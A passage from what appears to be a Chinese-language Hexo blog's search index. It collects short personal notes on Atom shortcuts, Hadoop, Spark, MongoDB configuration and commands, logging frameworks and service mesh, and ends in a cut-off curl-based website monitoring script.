    <url>%2F2018%2F06%2F28%2Fessay%2Fatom%2F</url>
    <content type="text"><![CDATA[英文 中文 快捷键 New Window 新建界面窗口 Ctrl + Shift + N 如中文意思 New File 新建文件 Ctrl + N 如中文意思 Open File 打开文件 Ctrl + O 如中文意思 Open Folder 打开文件夹 Ctrl + Shift + O 如中文意思 Add Project Folder 加载项目目录 Ctrl + Alt + O 如中文意思 Reopen Last Item 重新加载上次项目 Ctrl + Shift + T 如中文意思 Save 保存文件 Ctrl + S 如中文意思 Save As 另存为 Ctrl + Shift +S 如中文意思 Close Tab 关闭当前编辑文档 Ctrl + W 如中文意思 Close Window 关闭编辑器 Ctrl + Shift + W 如中文意思 Undo 撤销 Ctrl + Z 如中文意思 Redo 重做 Ctrl + Y 如中文意思 Cut 剪切 Shift + Delete 如中文意思 Copy 复制 Ctrl + Insert 如中文意思 Copy Path 复制文档路径 Ctrl + Shift + C 如中文意思 Paste 粘贴 Shift + Insert 如中文意思 Select All 全选 Ctrl + A 如中文意思 Select Encoding 选择编码 Ctrl + Shift +U 就是设置文件的编码 Go to Line 跳转到某行 Ctrl + G 支持行列搜索,Row:Column Slect Grammar 语法选择 Ctrl + Shift + L 和Sublime的Syntax设置功能一样 Reload 重载 Ctrl+ Alt +R 重新载入当前编辑的文档 Toggle Full Screen 全屏 F11 如中文意思 Increase Font Size 增大字体 Ctrl + Shift + “+” Sublime的Ctrl + 也能生效 Decrease Font Size 减小字体 Ctrl + Shift + “-“ Sublime的Ctrl - 也能生效 Toggle Tree View 展示隐藏目录树 Ctrl + （竖杠） Ctrl+b可以隐藏不能展示 Toggle Commadn palette 全局搜索面板 Ctrl + Shift + P 和Sublime的大同小异 Select Line 选定一行 Ctrl + L 如中文意思 Select First Character of Line 选定光标至行首 Shift + Home 如中文意思 Slect End of Line 选定光标至行尾 Shift + End 如中文意思 Select to Top 选定光标处至文档首行 Ctrl + Shift + Home 就是光标处作为分割线,取文档上部分 Select to Bottom 选定光标处至文档尾行 Ctrl + Shfit + End 就是光标处作为分割线,取文档下部分 Find in Buffer 从缓存器搜索 Ctrl + F 与Sublime一致 Replace in Buffer 高级替换 Ctrl + Shift + F 与Sublime一致 Select Next 匹配选定下一个 Ctrl + D 和Sublime一模一样有木有 Select All 匹配选定所有 Alt + F3 和Sublime一模一样有木有 Find File 查询文件,选定打开 Ctrl + P 与Sublime不一样 Delte End of Word 删除光标处至词尾 Ctrl + Del 如中文意思 Duplicate Line 复制行 Ctrl + Shift + D 复制光标所在行自动换行 Delete Line 删除一行 Ctrl + Shift + K 如中文意思 Toggle Comment 启用注释 Ctrl + / 与Sublime一致 Toggle developer tools 打开Chrome调试器 Ctrl + Alt + I 挺神奇的 Indent 增加缩进 Ctrl + [ 向右缩进 Outdent 减少缩进 Ctrl + ] 向左缩进 Move Line Up 行向上移动 Ctrl + up 如字面意思 Move Line Down 行向下移动 Ctrl + Down 如字面意思 Join Lines 行链接 Ctrl + J 追加 newline-below 光标之下增加一行 Ctrl + Enter 与sublime 一致 editor:newline-above 光标之上增加一行 Ctrl + Shift + Enter 与sublime 一致 pane:show-next-item 切换编辑的标签页 Ctrl + Tab 如中文意思 Fuzzy Finder 文件跳转面板 Ctrl + T 如字面意思 Select Line Move above 选中行上移 Ctrl + up 如中文意思 Select Line Move below 选中行下移 Ctrl + down 如中文意思 Symbol-view 进入变量、函数跳转面板。 Ctrl + R 如中文意思]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的技术图谱]]></title>
    <url>%2F2018%2F06%2F24%2Fessay%2Fessay-9%2F</url>
    <content type="text"><![CDATA[此技术图谱个人技术内容绘制 各位有缘到此的朋友可以参考构建自己的知识体系 不喜勿喷 {———-} 图谱分类 描述内容 容器 简介、docker、pouch-container、kubernetes、tomcat、jetty linux 命令、操作系统 JVM 内存、创建、回收 DB 数据库、mysql、mongoDB 协议 常见协议 http、https、tcp、udp、IM协议、JMS协议、AMQP协议 密码加密 base64、MD5、对称加密、非对称加密、混合加密、组合加密、hash加密 项目编译 maven、gradle【强烈推荐】 设计模式-创建型 工厂、抽象工厂、原型、建造者、单例 设计模式-结构型 适配器、组合、桥接、装饰、外观、代理、享元 设计模式-行为型 策略、责任链、模板、命令、解释器、迭代器、观察者、备忘录、访问者、状态、中介者 分布式架构及理论 常见分布式架构、spring cloud全家桶、RPC、拆分原则、CAP理论 事务 java事务、分布式事务、db事务 搜索引擎 爬虫、Nutch、solr、lucence、LIRE、es搜索引擎 权限 shiro 、数据权限、操作权限、oauth认证 消息中间件 kafka、rocketmq、rabbitmq、zeromq 算法 常见排序算法、限流、java回收、分布式算法、缓存算法、一致性算法 数据结构 hash、链表、数组、红黑树 线程 java线程、ExcutorService、ThreadPoolExcutor、线程状态、线程信息交换 缓存 缓存组件、redis、memcached、EHcache、 负载均衡 特点、解决方案、nginx、zuul、lvs、maglev、vortex、reaware、分布式流量负载 负载均衡算法 最常调用、最少活跃调用、轮询、加权轮询、最快反应调用、随机调用、etc. 锁 java锁、分布式锁、DB锁 分布式一致性控制 zookeeper、eureka、consul 金融级分布式中间件 SOFA【包含一整套：服务注册、服务熔断、服务健康检查、动态配置、定时任务、RPC、REST、服务链路追踪、服务监控、分布式事务、消息队列、以及服务网格支持各种发布实现、数据访问代理】 spring cloud 开源 blog主题]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能合约 简介]]></title>
    <url>%2F2018%2F06%2F23%2Fblock-chain%2Fblock-chain-1%2F</url>
    <content type="text"><![CDATA[智能合约发展史 区块链发展 智能合约简介 智能合约是“执行合约条款的计算机交易协议”。 [3] 区块链上的所有用户都可以看到基于区块链的智能合约。但是，这会导致包括安全漏洞在内的所有漏洞都可见，并且可能无法迅速修复。 [4]这样的攻击难以迅速解决，例如，2016年6月The DAOEther的漏洞造成损失5000万美元，而开发者试图达成共识的解决方案。 [5] DAO的程序在黑客删除资金之前有一段时间的延迟。以太坊软件的一个硬分叉在时限到期之前完成了攻击者的资金回收工作。 [6]以太坊智能合约中的问题包括合约编程Solidity、编译器错误、以太坊虚拟机错误、对区块链网络的攻击、程序错误的不变性以及其他尚无文档记录的攻击。[7] {———-} 智能合约应用场景 智慧链：通证token经济设计、 以太坊智能合约 区块链技术 智能合约审计 智能合约组件 连接物联网必要组成部分 智能合约集群 区块链技术]]></content>
      <categories>
        <category>block-chain</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop 简介]]></title>
    <url>%2F2018%2F06%2F20%2Fbig-data%2Fhadoop%2Fhadoop-1%2F</url>
    <content type="text"><![CDATA[hadoop发展史 Hadoop Apache Lucene创始人Doug Cutting 创建 基于 Nutch开发 本身也是lucence一部分 2004年 Doug Cutting 和Mike Cafarella 实现 HDFS和MapReduce初版 2005年 Nutch移植到新框架 Hadoop再20个节点稳定运行 2006年1月 Doug Cutting 加入雅虎 2006年2月 Apache Hadoop项目正式启动、支持MapReduce和HDFS独立发展 2006年4月 再188节点上（每节点10GB数据）运行排序测试集群需要47.9小时 2006年5月 雅虎建立一个300个节点的Hadoop研究集群 2006年5月 在500个节点运行排序测试集需要42个小时（硬件配置比四月份更优秀） 2006年11月 研究集群增加到600个节点 2006年12月 排序测试集在20个节点上运行1.8个小时、100个节点运行3.3个小时、500个节点运行5.2小时、900个节点需要7.8个小时。 2007年1月 研究集群增加到900个节点 2007年4月 研究集群增加到两个集群1000个节点 2008年4月 在900个节点上运行1TB排序测试集仅需要209秒 2008年10月 研究集群每天装载10TB数据 2009年3月 17个集群共24000个节点 2009年4月 在每分钟排序中胜出、59秒排序500GB（在1400个节点）、173分钟排序100TB数据（在3400节点） {———-} hadoop简介 大数据处理、应对数据处理出现的新的技术、 底层也就是大名鼎鼎的HDFS文件系统 对数据并发处理有极强的性能 hadoop-wiki hadoop应用场景 随着数据量的增大、数据量已经到了PB级别、数据的存储也需要更加强大的技术来支持、 hadoop组件 namenode节点负责存储目录 datanode节点负责存储数据 Map函数 接受一个键值对（key-value pair），产生一组中间键值对。 MapReduce框架会将map函数产生的中间键值对里键相同的值传递给一个reduce函数。 Reduce函数 接受一个键，以及相关的一组值，将这组值进行合并产生一组规模更小的值（通常只有一个或零个值）。 hadoop集群 namenode节点的可靠性 datanode节点的可靠性 让我想到了rocketmq nameserver负责存储消息路由订阅消息id 相当于菜单、 broker负责存储消息 相当于菜单下的数据 然后namenode节点的数据统一性？ paxos算法？ 当然其中会有很多消息的同步刷新异步刷新、消息节点重建、 怎么保证消息的完整性、怎么保证消息不丢失、怎么排序数据可执行性 很多东西、都是一样的、实现方式都是一个东西、也就是实现的代码可能会不同而已 hadoop 开发思想 分而治之、大任务拆分小任务执行 数据：分片存储、并发调度、结果综合查询 Job&amp;task、Job&amp;Tracker、Task&amp;Tracker Job&amp;task 任务执行 Job&amp;Tracker 作业调度 分配任务、监控任务执行调度 监控taskTracker状态 Task&amp;Tracker 执行任务 汇报任务 容错机制 重复执行 推测执行]]></content>
      <categories>
        <category>big-data</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spark 简介]]></title>
    <url>%2F2018%2F06%2F20%2Fbig-data%2Fspark%2Fspark-1%2F</url>
    <content type="text"><![CDATA[spark发展史 Apache Spark Spark Logo 开发者 Apache软件基金会, 加州大学柏克莱分校AMPLab, Databricks 稳定版本 2.1.0 （2016年12月28日 ） 开发状态 活跃 编程语言 Scala, Java, Python 操作系统 Linux, Mac OS, Microsoft Windows 类型 数据分析, 机器学习算法 许可协议 Apache许可协议 2.0 网站 spark.apache.org 源代码库 github.com/apache/spark Apache Spark是一个开源集群运算框架，最初是由加州大学柏克莱分校AMPLab所开发。 相对于Hadoop的MapReduce会在运行完工作后将中介数据存放到磁盘中，Spark使用了存储器内运算技术，能在数据尚未写入硬盘时即在存储器内分析运算。 Spark在存储器内运行程序的运算速度能做到比Hadoop MapReduce的运算速度快上100倍，即便是运行程序于硬盘时，Spark也能快上10倍速度。 [1]Spark允许用户将数据加载至集群存储器，并多次对其进行查询，非常适合用于机器学习算法。 {———-} spark简介 spark应用场景 使用Spark需要搭配集群管理员和分布式存储系统。 Spark支持独立模式（本地Spark集群）、Hadoop YARN或Apache Mesos的集群管理。 [3] 在分布式存储方面，Spark可以和HDFS[4]、 Cassandra[5] 、OpenStack Swift和Amazon S3等接口搭载。 Spark也支持伪分布式（pseudo-distributed）本地模式，不过通常只用于开发或测试时以本机文件系统取代分布式存储系统。 在这样的情况下，Spark仅在一台机器上使用每个CPU核心运行程序。 spark组件 Spark核心是整个项目的基础，提供了分布式任务调度，调度和基本的I／O功能。而其基础的程序抽象则称为弹性分布式数据集（RDDs），是一个可以并行操作、有容错机制的数据集合。 RDDs可以通过引用外部存储系统的数据集创建（例如：共享文件系统、HDFS、HBase或其他 Hadoop 数据格式的数据源）。 或者是通过在现有RDDs的转换而创建（比如：map、filter、reduce、join等等）。 RDD抽象化是经由一个以Scala, Java, Python的语言集成API所呈现，简化了编程复杂性，应用程序操纵RDDs的方法类似于操纵本地端的数据集合。 spark集群]]></content>
      <categories>
        <category>big-data</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-cache%2F</url>
    <content type="text"><![CDATA[缓存 图谱 memcached 图谱 redis 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各大开源组件解析 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-component%2F</url>
    <content type="text"><![CDATA[spring dubbo lucence spring spring 图谱dubbo 图谱 {———-} lucence 图谱java 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-container%2F</url>
    <content type="text"><![CDATA[本图谱 描述 docker pouch container kubernetes jetty tomcat 容器 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-translation%2F</url>
    <content type="text"><![CDATA[事务 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-design-model%2F</url>
    <content type="text"><![CDATA[设计模式 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-load-balance%2F</url>
    <content type="text"><![CDATA[负载均衡 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-distributed%2F</url>
    <content type="text"><![CDATA[分布式 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[消息中间件 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-message%2F</url>
    <content type="text"><![CDATA[消息中间件特点 图谱rabbitmq 图谱 {———-} rocketmq 图谱zeromq 图谱kafka 图谱activemq 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码加密 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-password%2F</url>
    <content type="text"><![CDATA[密码加密 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-permission%2F</url>
    <content type="text"><![CDATA[权限 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[锁 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-lock%2F</url>
    <content type="text"><![CDATA[锁 图谱 mysql锁、优化]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎·二 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-search-engine-1%2F</url>
    <content type="text"><![CDATA[nutch 图谱 lucence 图谱 {———-} egothor 图谱 lire 图谱 compass 图谱 indextank 图谱 solandra 图谱 solr 图谱 elasticsearch 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[协议 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-protocol%2F</url>
    <content type="text"><![CDATA[协议 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-algorithm%2F</url>
    <content type="text"><![CDATA[算法 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎·一 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-search-engine-0%2F</url>
    <content type="text"><![CDATA[搜索引擎简介 图谱搜索引擎通用特点 图谱 {———-} SEO 图谱 爬虫 图谱]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[easy-cloud]]></title>
    <url>%2F2018%2F06%2F09%2Fspring-cloud%2Feasy-cloud%2F</url>
    <content type="text"><![CDATA[总有一件事 是你想做的 代码地址github 1234567891011121314151617add 用户认证请求授权 用户授权返回授权令牌 *第三方请求权限 返回请求令牌 *校验系统是否注册 *校验用户是否存在 保存redis mq落地db *返回授权调用code 一般使用一次 五分钟 *校验用户凭证 本系统分发出去用户确定用户有效唯一凭证 可以是登陆token * 第零 确定system是否有效 * 第一确定code有效 * 第二验证用户token * 第三分配数据访问权限 保存redis mq落地db * 第四 返回 授权令牌 * * 之后第三方系统 携带 系统id 用户账号 以及想访问的资源 向我系统请求数据]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 简介]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-1%2F</url>
    <content type="text"><![CDATA[mongodb官方docBSON格式文档型分片存储服务BSON格式 与json类似 优点：解释快 应用点：支持大量存储、数据格式灵活多样、广泛的索引结构、优秀的集群管理缺点：不支持事务、成本高 mongodb 组成部件 1、实际存储服务分片--存储json数据 2、路由 mongos--负责把请求转发到正确的服务器上 3、配置服务器---跟踪服务集群状态 每个组件都是集群服务、即多进程服务、更稳定、预防节点宕机倒是集群gg {———-} mongodb 数据结构 与es一样 document文档行数据库 Collections ： 文档集合 document ： 文档 特殊存储 GridFS：因为bson对象的大小有限制，不适合存储大型文件，GridFS文件系统为大型文件提供了存储的方案，GridFS下的fs保存的是图片、视屏等大文件。 mongodb 存储方式 集群 自动扩散是分片存储。 自动检测分片存储数据大小、数据自动流转到空闲节点、对外使用暴露统一服务调用 mongodb 存储引擎 MongoDB支持多个存储引擎 MongoDB 3.2开始的默认存储引擎使用WiredTiger 它非常适合大多数工作负载，建议用于新部署。 WiredTiger提供了文档级并发模型，检查点和压缩等功能。在MongoDB Enterprise中，WiredTiger还支持静态 加密。 3.2之前的MongoDB版本的默认存储引擎 是 MMAPv1。 MMAPv1在具有大量读取和写入以及就地更新的工作量上表现良好。 mongodb 存储索引 Single Field【单字段索引】 Compound Index【复合索引】 Multikey Index【多键索引】 Geospatial Index【地理空间索引】 Text Indexes【文本索引】 Hashed Indexes【hash索引】 Unique Indexes【唯一索引】 Partial Indexes【部分索引、3.2之后新加索引】 索引符合指定过滤器表达式的集合中的文档。 通过索引集合中的文档子集，部分索引的索引创建和维护的存储需求更低，性能成本更低。 部分索引提供了稀疏索引功能的超集，应该优先于稀疏索引。 Sparse Indexes【稀疏索引】 索引仅包含具有索引字段的文档的条目。索引跳过没有索引字段的文档。 TTL Indexes【TTL索引】 TTL索引是一些特殊的索引，MongoDB可以在一段时间后使用它自动从集合中删除文档。这对于某些类型的信息比如机器生成的事件数据，日志和会话信息是理想的，这些信息只需要在有限的时间内保留在数据库中。]]></content>
      <categories>
        <category>java</category>
        <category>mongodb</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 集群]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-2%2F</url>
    <content type="text"><![CDATA[mongodb 配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546# mongod.conf# for documentation of all options, see:# http://docs.mongodb.org/manual/reference/configuration-options/# where to write logging data.systemLog: destination: file logAppend: true #path: /var/log/mongodb/mongod.log path: /opt/env/mongodb-3.6.5/log/mongod.log# Where and how to store data.storage: #dbPath: /var/lib/mongo dbPath: /opt/env/mongodb-3.6.5/data journal: enabled: true# engine:# mmapv1:# wiredTiger:# how the process runsprocessManagement: fork: true # fork and run in background pidFilePath: /var/run/mongodb/mongod.pid # location of pidfile# network interfacesnet: port: 27027 bindIp: 0.0.0.0 # Listen to local interface only, comment to listen on all interfaces.#security:#operationProfiling:#replication:#sharding:## Enterprise-Only Options#auditLog:#snmp: {———-} mongodb 集群]]></content>
      <categories>
        <category>java</category>
        <category>mongodb</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 使用]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-4%2F</url>
    <content type="text"><![CDATA[mongodb 使用 12345678910111213141516171819202122232425262728293031文档性数据库 针对类型、无格式文档、只根据id、type区分代码 使用封装data-mongodb数据@AutowiredMongoTemplate mongoTemplate;mongoTemplate.save(logDocument);//入参 当前第1页、显示20条数据、搜索类型demo封装类Query query = new Query(); //构造分页请求信息 Sort sort = new Sort(Sort.Direction.DESC,&quot;createTime&quot;); PageRequest pageRequest = new PageRequest(1,20,sort); query.with(pageRequest); query.addCriteria(Criteria.where(&quot;id&quot;).is(demo.getId());mongoTemplate.find(query,LogDocument.class);///指定全文模糊匹配检索 代码片段 用作以后参考 TextCriteria criteria = new TextCriteria(); Map&lt;String,String&gt; map = JsonUtil.beanToMap(demo); for(String string :map.values())&#123; criteria.matching(string); &#125;]]></content>
      <categories>
        <category>java</category>
        <category>mongodb</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 命令]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-3%2F</url>
    <content type="text"><![CDATA[mongodb 命令 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#启动/opt/env/mongodb-3.6.5/bin/mongod --config /etc/mongod.conf--config 加载配置--dbpath 数据存放路径--port 启动端口--fork 以守护方式启动进程 相当于 nohup **** &amp;--logpath 日志路径 --append 追加日志 保留以前日志--directoryperdb 每个数据库单独一个文件夹#数据库操作show dbs;show collections;show users;use &lt;db_name&gt;;//如果存在切换 如果不存在 新建并切换#查看帮助db.help();db.foo.help();db.foo.find();db.foo.find(&#123;a:1&#125;);#查看状态db.status();db.version();#查看当前链接机器地址db.getMongo();db.shutdownServer();#数据操作db.user.find();db.user.findOne();db.user.update();db.user.remove();]]></content>
      <categories>
        <category>java</category>
        <category>mongodb</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kuberments]]></title>
    <url>%2F2018%2F06%2F04%2Fservice-mesh%2Fservice-mesh-2%2F</url>
    <content type="text"><![CDATA[pdf 文档 社区文档下载]]></content>
      <categories>
        <category>java</category>
        <category>service-mesh</category>
      </categories>
      <tags>
        <tag>service-mesh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志服务的选型]]></title>
    <url>%2F2018%2F06%2F04%2Flog%2Flog-selected%2F</url>
    <content type="text"><![CDATA[众所周知. 日志系统分为：系统日志和业务日志业务日志又可分为请求日志和操作日志 系统日志1cpu、内存、请求量、当前连接数、连接时间等等 {———-} 请求日志12345谁、请求那个系统上的什么资源、源ip系统id目标ip目标url 操作日志12345678910111213141516需求：各个子系统统一业务日志收集、这些日志消息包括： 操作系统标识 操作者 操作模块 操作类型 操作时间 操作内容 操作结果 简而言之：什么人在什么时候修改了什么系统上的哪些模块的哪些内容 who 、when、where、what、how、【4w1h】 至于why 日志是检测不出来的。。。 方案一：mysql+logback123456优点：简单随库、成本低;持久化不丢失、支持读写分离、缺点：表设计不free、一旦设计好就不能随意添加字段 不支持定时清理日志、占用数据库链接、 如果建立大量检索索引、添加数据要慢、如果索引较少、检索数据有不会很准确、现阶段mysql5.5以后使用innodb引擎、而这种引擎最大的优点就是支持了事务、变相的也降低了他的读写性能、但是在需求上不需要事务的支持、 方案二：mongdb+logback1234优点：支持定时清理、支持数据字段任意扩充【文档型】、 支持读写分离、检索识别度高、支持索引结构比较广泛、支持多种形式查询缺点：成本稍微高 比mysql数据库要贵点、 方案三：ELK 【ELK】 方案四：Splunk 方案五：Fluentd 一般用在 k8s 容器服务的日志收集CSDN linux 运维 方案六：Flume 博客园 方案六：KafKa+logback]]></content>
      <categories>
        <category>java</category>
        <category>log</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志发展史]]></title>
    <url>%2F2018%2F06%2F04%2Flog%2Flog-total%2F</url>
    <content type="text"><![CDATA[日志总图接口定制组建使用interface标识具体实现组建使用class标识 you must know 从log4j到log4j2.0 logback是log4j升级版 是slf4j完美实现sun出品的接口JUL、后来的commons-logging ceki写的slf4j、logback、log4j、log4j2.0 这人简直神了 日志发展史上重要人物啊 写一个一个规则 {———-} 现在多数工厂都在用logback 不过想原文讲的log4j2.0 在针对新业务的特性上 有很大提升 log4j特性、也奠定了日志大致方向 1、允许应用记录日志对象、开发不考虑日志输出位置、日志信息以object传递 2、每个logger互相独立 以名字标识区分 3、Appender属性 配置日志输出路径【文件、consoler、DB、MQ、etc】 4、level 定制日志级别输出 logback特性 xml配置方式和grovvy支持 自动重载有变更配置文件 自动压缩日志 打印异常信息自动包含package名称以及版本号 filters 谨慎模式 自动清除旧文档 http访问功能 丰富过滤模式 日志组建发展时间图 slf4j简介slf4j 结构图 使用“{}” 代替参数传输 绑定方式：混合绑定、桥接绑定 混合绑定 两种方式：使用适配器接向底层实现interface 、或者直接实现slf4j 接口 适配器：slf4j+log4j[1.2.17] slf4j+JDK14[1.7.21] 接口实现：logback-classic[1.0.13]、slf4j-simple[1.7.21] slf4j 混合绑定 桥接绑定 针对老项目日志迁移 以slf4j 为接口中间层 将上层旧日志框架的消息转发到底层绑定的新日志框架上. 基于j.u.l的facade使用基于logback-classic的facade使用基于log4j的facade使用 代码就去原文找吧、这里只是技术方案 原文链接]]></content>
      <categories>
        <category>java</category>
        <category>log</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[service-mesh简介]]></title>
    <url>%2F2018%2F06%2F04%2Fservice-mesh%2Fservice-mesh-1%2F</url>
    <content type="text"><![CDATA[什么是service-mesh？ 字面理解服务网格 功能：代理服务实现微服务功能、 服务发现 负载均衡 路由 流量控制 通信可靠性 弹性可伸缩 安全 监控以及日志 {———-} 有人会说 这个为服务网关 不是早就实现了吗？ 答：是，是实现了、但是所有的技术都有取舍、缺陷、 为服务上的网管对服务的侵入太多、太多的网管代理还会使服务变得很臃肿、 作为对外的唯一暴露服务、他的弹性伸缩做的还比较差、需要重启服务网关重新加载服务代理 service-mesh 服务治理做了什么？ 答：服务网格基于docker、kuberments Service Mesh由data plane构成，其中所有服务通过sidecar代理进行服务通信。 （所有代理相互连接形成一个Mesh，Service Mesh由此得名） 网格同时包含一个control plane——可以将所有独立的sidecar代理连接到一个分布式网络中， 并设置网格还包括一个控制平面——它将所有独立的sidecar代理连接到一个分布式网络中， 并设置由data plane指定的策略。 Control plane定义服务发现、路由、流量控制等策略。 这些策略可以是全局的，也可以是限定的。Data plane负责在通信时应用和执行这些策略。 service-mesh 与 spring-cloud service-mesh 是一套全新的服务网格系统、不渗入原有代码 使用代理slipder完成服务代理 请求 spring-cloud spring家族 面对现有组建众多复杂性、打造出一个cloud专版、 理论点：连接一切、集成市场主流应用 两者都是在为微服务做着自己的方向、互不侵犯、互不融合、各有各的目标和愿景 现有体系下 都在上云、很多确实都是在 先上springcloud 再上service-mesh 最起码等待实际生产环境的验证 一种明悟、应用组件这种发展越来越嵌入基础层、所有共性的服务渐渐的由应用层组件转向了计算机网络通信组件、就像tcp、 如果说spring cloud是应用级别的分布式服务控制、那么service mesh是建立在计算机基础服务上的分布式服务控制、 提取了共性的服务注册、服务代理 做出了一套基础计算机服务、专门面向分布式系统的一种基础服务、未来会不会像mysql一样流行、 原文地址 资料地址]]></content>
      <categories>
        <category>java</category>
        <category>service-mesh</category>
      </categories>
      <tags>
        <tag>service-mesh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 监控服务脚本]]></title>
    <url>%2F2018%2F05%2F30%2Fshell%2Fshell-4%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021 #!/bin/shweblist=/shell/web_monit/weblist.txt for list in `cat $weblist|grep -E -v &quot;#|^$&quot;` dohttpcode=`curl -o /dev/null -s -w %&#123;http_code&#125; &quot;$list&quot;` httptime=`curl -o /dev/null -s -w &quot;time_connect: %&#123;time_connect&#125;\ntime_starttransfer: %&#123;time_starttransfer&#125;\ntime_total: %&#123;time_total&#125;\n&quot; &quot;$list&quot;|grep time_total|awk -F &quot;:&quot; &apos;&#123;print $2*1000&#125;&apos;`if [ $httpcode = 500 ]||[ $httpcode = 502 ]||[ $httpcode = 503 ]||[ $httpcode = 504 ]then curl -d &quot;mobile=13800008888&amp;text=访问 $list 超时&quot; &quot;http://127.0.0.1/sms/&quot;else echo &quot;$list is checked ok!&quot;fi if [ $httptime -ge 3000 ]then curl -d &quot;mobile=13800008888&amp;text=访问 